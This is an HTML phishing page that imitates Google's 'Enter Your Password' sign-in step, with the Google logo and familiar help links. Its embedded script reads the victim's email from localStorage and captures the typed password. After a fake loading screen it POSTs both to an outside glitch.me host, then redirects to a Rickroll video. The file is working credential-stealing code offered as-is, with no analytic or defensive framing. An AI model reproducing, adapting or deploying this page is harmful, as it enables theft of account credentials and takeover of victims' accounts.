<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Your Password</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#F8F9FA] flex justify-center items-center min-h-screen">

    <div class="w-full max-w-md bg-white rounded-lg shadow-xl p-6">
        <div class="flex justify-center mb-6">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" class="h-12">
        </div>

        <h1 class="text-2xl font-semibold text-gray-900 mb-4">Enter Your Password</h1>
        <p class="text-sm text-gray-600 mb-4">Hi <span id="user-name"></span>, enter your password to continue.</p>

        <form id="password-form">
            <div class="mb-4">
                <label class="sr-only" for="password">Password</label>
                <input class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg" id="password" name="password" placeholder="Enter your password" type="password" required>
            </div>
            <div class="flex justify-between items-center mb-6">
                <a class="text-blue-600 text-sm" href="#">Forgot password?</a>
            </div>
            <p class="text-sm text-gray-600 mb-6">
                Not your computer? Use Guest mode to sign in privately.
                <a class="text-blue-600" href="#">Learn more about using Guest mode</a>
            </p>
            <div class="flex justify-between items-center">
                <button class="bg-blue-600 text-white px-6 py-2 rounded-md text-lg" type="submit" id="next-btn">Next</button>
            </div>
        </form>
    </div>

    <footer class="w-full bg-[#F8F9FA] py-4">
        <div class="flex justify-between items-center text-gray-600 text-sm px-6">
            <div>
                <select class="bg-transparent text-sm text-gray-600">
                    <option>English (United States)</option>
                </select>
            </div>
            <div class="flex space-x-4">
                <a class="hover:underline" href="#">Help</a>
                <a class="hover:underline" href="#">Privacy</a>
                <a class="hover:underline" href="#">Terms</a>
            </div>
        </div>
    </footer>

    <script>
        // Get the email from localStorage
        const email = localStorage.getItem('email');
        
        // Extract the name from the email (before the @)
        const name = email ? email.split('@')[0] : 'User';
        
        // Display the name in the greeting
        document.getElementById('user-name').textContent = name;

        // Handle the password form submission
        document.getElementById('password-form').addEventListener('submit', function(event) {
            event.preventDefault();

            const password = document.getElementById('password').value.trim();

            // Check if password is at least 6 characters long
            if (password.length < 6) {
                return;
            }

            // Show loading animation (after form submission)
            document.body.innerHTML = `
                <div class="flex-grow flex items-center justify-center">
                    <div class="text-xl font-semibold text-gray-900">Loading...</div>
                </div>
            `;

            // Simulate delay of 3-4 seconds before sending data
            setTimeout(() => {
                // Send data to the backend
                fetch('https://chipped-pine-tarascosaurus.glitch.me/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password }),
                })
                .then(response => response.json())
                .then(data => {
                    // Redirect to Rickroll after 3-4 seconds delay
                    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; // Redirect to Rickroll
                })
                .catch(error => {
                    console.error('Error:', error);
                    // Optionally, handle the error on the page
                    document.body.innerHTML = `
                        <div class="flex-grow flex items-center justify-center">
                            <div class="text-xl font-semibold text-gray-900">Oops, something went wrong! Please try again.</div>
                        </div>
                    `;
                });
            }, 3000); // 3-second delay before sending data
        });
    </script>
</body>
</html>
